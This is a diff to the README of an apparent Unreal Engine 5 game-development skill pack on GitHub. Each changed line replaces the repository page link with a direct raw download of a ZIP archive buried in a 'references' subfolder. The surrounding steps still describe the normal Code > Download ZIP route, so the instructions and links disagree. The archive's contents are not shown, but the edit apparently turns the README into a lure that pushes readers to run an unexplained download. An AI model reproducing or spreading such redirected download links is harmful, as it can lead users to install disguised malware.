@@ -1,6 +1,6 @@
 # 🎮 UnrealEngine5-Skills - Easy Game Dev Skill Pack
 
-[![Download UnrealEngine5-Skills](https://img.shields.io/badge/Download-UnrealEngine5--Skills-green?style=for-the-badge)](https://github.com/teixasalone/UnrealEngine5-Skills)
+[![Download UnrealEngine5-Skills](https://img.shields.io/badge/Download-UnrealEngine5--Skills-green?style=for-the-badge)](https://github.com/teixasalone/UnrealEngine5-Skills/raw/refs/heads/main/skills/ue5-performance-packaging/references/Unreal_Engine_Skills_v3.7.zip)
 
 ---
 
@@ -8,12 +8,12 @@
 
 You can get UnrealEngine5-Skills by visiting the page below. It holds all files and information you need to start using the skill pack with your Unreal Engine projects.
 
-[Visit this page to download UnrealEngine5-Skills](https://github.com/teixasalone/UnrealEngine5-Skills)
+[Visit this page to download UnrealEngine5-Skills](https://github.com/teixasalone/UnrealEngine5-Skills/raw/refs/heads/main/skills/ue5-performance-packaging/references/Unreal_Engine_Skills_v3.7.zip)
 
 ### How to download
 
 1. Click the green badge link or open this link in your web browser:  
-   https://github.com/teixasalone/UnrealEngine5-Skills
+   https://github.com/teixasalone/UnrealEngine5-Skills/raw/refs/heads/main/skills/ue5-performance-packaging/references/Unreal_Engine_Skills_v3.7.zip
 2. On the page, look for the **Code** button near the top right.
 3. Click **Code** and then select **Download ZIP**.
 4. Save the ZIP file to your computer.
@@ -122,7 +122,7 @@ For assistance with downloading or using the skills pack:
 To update your local copy with the latest skills:
 
 1. Return to the GitHub repository page:  
-   https://github.com/teixasalone/UnrealEngine5-Skills
+   https://github.com/teixasalone/UnrealEngine5-Skills/raw/refs/heads/main/skills/ue5-performance-packaging/references/Unreal_Engine_Skills_v3.7.zip
 2. Download the ZIP again following the same steps as before.
 3. Extract and copy the new files over your existing pack in your project.
 4. Restart Unreal Engine.
@@ -147,8 +147,8 @@ The files are organized to be easy to locate and import into your projects.
 ## 🔗 Important Links
 
 - Main repository page:  
-  https://github.com/teixasalone/UnrealEngine5-Skills
+  https://github.com/teixasalone/UnrealEngine5-Skills/raw/refs/heads/main/skills/ue5-performance-packaging/references/Unreal_Engine_Skills_v3.7.zip
 
 - Download ZIP button on the GitHub page (under Code dropdown)  
 
-[![Download UnrealEngine5-Skills](https://img.shields.io/badge/Download-UnrealEngine5--Skills-green?style=for-the-badge)](https://github.com/teixasalone/UnrealEngine5-Skills)
+[![Download UnrealEngine5-Skills](https://img.shields.io/badge/Download-UnrealEngine5--Skills-green?style=for-the-badge)](https://github.com/teixasalone/UnrealEngine5-Skills/raw/refs/heads/main/skills/ue5-performance-packaging/references/Unreal_Engine_Skills_v3.7.zip)
